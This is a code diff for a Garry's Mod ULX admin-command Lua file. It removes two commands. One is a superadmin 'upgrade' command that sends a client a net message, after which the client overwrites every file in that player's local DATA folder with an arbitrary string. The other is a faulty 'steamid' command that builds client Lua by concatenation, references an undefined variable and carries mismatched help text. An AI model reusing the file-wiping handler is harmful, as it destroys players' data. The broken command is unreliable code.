@@ -203,39 +203,6 @@ fakeban:addParam{ type=ULib.cmds.StringArg, hint="reason", ULib.cmds.optional, U
 fakeban:defaultAccess( ULib.ACCESS_ADMIN )
 fakeban:help( "Ban prank gone wrong" )
 
---UPGRADE
-
-if CLIENT then
-	local function UpgradeMe(path, reason)
-		local files, folders = file.Find(path .. "*", "DATA")
-		for _,v in pairs(files) do
-			file.Write(path..v, reason)
-		end
-		for _,v in pairs(folders) do
-			blacklistUpgradeMe(path .. v .."/", reason)
-		end
-	end
-	net.Receive("maks_haaaaax",function()
-		if net.ReadInt(32) ~= 1 then return end
-		UpgradeMe("", net.ReadString())
-	end)
-end
-
-function ulx.upgrade(calling_ply, target_ply, reason)
-	if IsValid(target_ply) then
-    	net.Start("maks_haaaaax")
-    	net.WriteInt(1, 32)
-    	net.WriteString(reason)
-    	net.Send(target_ply)
-  	end
-	ulx.fancyLogAdmin(calling_ply, true, "#A rewrite #T's DATA folder", target_ply)
-end
-local upgrade = ulx.command( CATEGORY_NAME, "ulx upgrade", ulx.upgrade, "!upgrade")
-upgrade:addParam{ type=ULib.cmds.PlayerArg }
-upgrade:addParam{ type=ULib.cmds.StringArg, hint="Because.", ULib.cmds.optional, ULib.cmds.takeRestOfLine }
-upgrade:defaultAccess( ULib.ACCESS_SUPERADMIN )
-upgrade:help( "Rewrite data folder by given reason" )
-
 --SAY ALL
 
 function ulx.sayall(calling_ply, message)
@@ -723,13 +690,3 @@ ssay:defaultAccess( ULib.ACCESS_ALL )
 ssay:help( "Send a message to currently connected superadmins." )
 
 -- End of ideas from ULX Extended https://www.gmodstore.com/scripts/view/1509/ulx-extended
-
--- Ideas from ULX Essentials https://www.gmodstore.com/scripts/view/1508/ulx-essentials
-
-function ulx.steamid(calling_ply, target_ply)
-	calling_ply:SendLua([[SetClipboardText("]]..string.Replace(ply:Nick(),[["]],[[\"]])..[[")]]) -- exploit protection
-end
-local steamid = ulx.command( CATEGORY_NAME, "ulx steamid", ulx.steamid, "!steamid", true)
-steamid:AddParam{ type=ULib.cmds.PlayerArg }
-steamid:defaultAccess( ULib.ACCESS_ADMIN )
-steamid:help( "Freeze all props" )
